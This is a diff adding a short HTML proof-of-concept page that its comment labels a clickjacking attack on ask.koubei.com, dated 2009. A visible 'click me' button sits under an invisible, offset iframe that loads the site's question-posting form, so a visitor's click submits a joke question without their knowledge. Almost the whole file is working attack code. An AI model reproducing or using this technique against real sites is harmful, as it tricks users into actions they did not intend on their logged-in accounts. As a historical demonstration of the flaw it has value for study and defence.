@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+    <!--
+        -= Clickjacking Attack =-
+
+          site: ask.koubei.com 
+          date: 2009-06-17
+        author: mingcheng<i.feelinglucky[a]gmail.com>
+    -->
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    </head>
+    <body>
+        <button>点击下我</button>
+        <div id="con">
+            <iframe src="http://ask.koubei.com/question/?link=ask_write&title=明城到底帅不帅？"></iframe> 
+        </div>
+        <style>
+            #con {
+                position: relative;
+                overflow: hidden;
+                z-index: 2;
+                width: 70px;
+                height: 20px;
+                margin: -20px 0px 0px 0px;
+            }
+
+            #con iframe {
+                border: 0px;
+                width: 500px;
+                height: 500px;
+                margin: -384px 0px 0px -135px;
+                opacity: 0;
+            }
+        </style>
+        <a target="_blank" href="http://ask.koubei.com/my/my_question_ask">http://ask.koubei.com/my/my_question_ask</a>
+    </body>
+</html>
